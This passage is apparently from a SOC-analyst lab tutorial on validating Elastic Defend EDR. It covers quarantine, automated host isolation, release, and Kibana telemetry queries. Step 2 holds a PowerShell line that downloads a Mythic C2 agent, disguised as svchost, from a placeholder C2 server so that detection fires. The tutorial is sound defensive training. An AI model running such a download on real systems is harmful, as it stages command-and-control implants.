#### Step 1: Confirm Network Connectivity (Baseline)

On the Windows Server, open **Command Prompt** and run a continuous ping to confirm network is currently up:

```cmd
ping 8.8.8.8 -t
```

You should see replies coming in. **Leave this running** — it's your indicator of when isolation kicks in.

---

#### Step 2: Attempt to Download a Fresh C2 Agent

On the Windows Server, open **PowerShell** and use Invoke-WebRequest to download the Mythic agent from your C2 server's HTTP listener:

```powershell
Invoke-WebRequest -Uri "http://<Mythic-server-IP>:<port>/svchost-[name].exe" -OutFile "C:\Users\Public\Downloads\svchost-[name].exe"
```

**Expected sequence of events:**

1. The download begins (or may not even complete).
2. Elastic Defend detects the executable being written to disk.
3. Elastic Defend **quarantines the file** — it is deleted from the download location and moved to the quarantine store.
4. Elastic Defend **kills the associated process** if one was launched.
5. The malware alert fires in Kibana.
6. The automated response action triggers — the host is **isolated from the network**.
7. Your `ping 8.8.8.8 -t` in the Command Prompt window shows **Request timed out** — confirming isolation is active.

---

#### Step 3: Confirm Isolation in Kibana

1. Go to **Security → Manage → Endpoints**.
2. Your Windows Server should now show an **Isolated** status badge.
3. In the **Actions** menu, you'll see a **Release host** option — use this to restore connectivity after your test.

> 🔑 **Important:** Always release the host after testing. A permanently isolated endpoint cannot receive policy updates or forward logs to Elastic. In a real incident, you would release isolation only after confirming the threat has been fully remediated.

---

#### Step 4: Release the Host

1. On the Endpoints page, click **Actions** next to your Windows Server.
2. Click **Release host**.
3. Add a note:
   ```
   Testing complete. Host released after successful isolation validation.
   ```
4. Click **Confirm**.

Your `ping 8.8.8.8 -t` in Command Prompt should resume receiving replies within 30–60 seconds, confirming the host is back on the network.

---

### 📊 What Elastic Defend Telemetry Looks Like

After the test, you can query the raw Elastic Defend telemetry in Kibana Discover:

```kql
agent.type : "endpoint"
```

This returns all events generated by Elastic Defend. Useful sub-queries:

| Query | What It Returns |
|-------|----------------|
| `event.action : "quarantine"` | Files quarantined by EDR |
| `event.action : "kill-process"` | Processes terminated by EDR |
| `event.action : "isolated"` | Host isolation events |
| `event.action : "unisolated"` | Host release events |
| `event.category : "malware"` | All malware-category events |

---

### ✅ Summary of Key Takeaways

| Topic | Key Point |
|-------|-----------|
| What Elastic Defend is | An EDR — actively blocks threats at the endpoint, not just alerts |
| Installation method | Added via Kibana Integrations, deployed through Fleet (no manual install on endpoint) |
| Configuration type | Always choose **Complete EDR** for full telemetry and protection |
| Endpoint type | **Traditional Endpoints** for VMs, servers, desktops |
| Verification | Check **Security → Manage → Endpoints** for active status |
| Malware detection | Query `malware` in Discover, or check Security Alerts for Malware Prevention Alerts |
| Alert detail | Process tree + highlighted fields are auto-populated by Elastic Defend |
| Automated isolation | Configure via **Response Actions** tab in any detection rule → Elastic Defend → Isolate host |
| Isolation verification | Continuous ping drops to "Request timed out" when host is isolated |
| Release host | Always release after testing — isolated hosts stop forwarding logs |
| Free vs paid | Detection and quarantine work on free tier; remote isolation requires trial/paid |

---

### 🔄 How Elastic Defend Fits Into the Full SOC Architecture

```
Attacker attempts to run Mythic C2 agent on Windows Server
          │
          ▼
  Elastic Defend (EDR) detects malware on endpoint
          │
          ├─► Quarantines the file
          ├─► Kills the process
          └─► Generates telemetry → forwarded to Elastic via Agent
                    │
                    ▼
         Elastic SIEM receives the event
                    │
                    ├─► Malware Prevention Alert created in Kibana
                    ├─► Alert visible in Security → Alerts
                    └─► Response Action triggers → Host isolated
                                   │
                                   ▼
                    SOC Analyst reviews alert in Kibana
                    Investigates process tree + file hash
                    Releases host after remediation
```

---

### 🔗 Resources

- 📖 [Elastic Defend Official Documentation](https://www.elastic.co/docs/solutions/security/get-started/get-started-endpoint-security)
- 📖 [Elastic Defend — Automated Response Actions](https://www.elastic.co/guide/en/security/current/automated-response-actions.html)
- 📖 [Elastic Defend — Host Isolation](https://www.elastic.co/guide/en/security/current/host-isolation-ov.html)
- 📖 [Elastic Endpoint Response Actions Reference](https://www.elastic.co/guide/en/security/current/response-actions.html)
- 🔎 [VirusTotal — File Hash Lookup](https://www.virustotal.com)
---

> *Part of the MyDFIR 30-Day SOC Analyst Challenge. This tutorial is based on Day 29 content and is intended for educational purposes only. Elastic Defend and C2 tools should only be used in authorized lab environments.*
